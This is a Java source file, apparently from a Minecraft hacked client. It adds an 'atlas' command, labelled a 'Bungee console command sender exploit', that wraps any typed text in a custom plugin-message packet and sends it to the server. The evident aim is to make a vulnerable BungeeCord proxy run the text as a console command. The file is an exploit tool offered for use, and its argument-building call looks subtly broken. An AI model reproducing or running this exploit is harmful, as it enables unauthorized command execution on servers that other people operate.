package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;

import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import net.paradise_client.Helper;
import net.paradise_client.command.Command;
import net.paradise_client.packet.BungeeCommandPacket; // Adjust if your writer is located elsewhere

public class BungeeConsole extends Command {

    public BungeeConsole(MinecraftClient minecraftClient) {
        super("atlas", "Bungee console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
            .executes(context -> {
                Helper.printChatMessage("Incomplete command!");
                return 1;
            })
            .then(LiteralArgumentBuilder.<CommandSource>argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand));
    }

    private int executeCommand(CommandContext<?> context) {
        String command = context.getArgument("command", String.class);
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new BungeeCommandPacket(command));
        Helper.sendPacket(packet);
        Helper.printChatMessage("Payload sent!");
        return 1;
    }
}
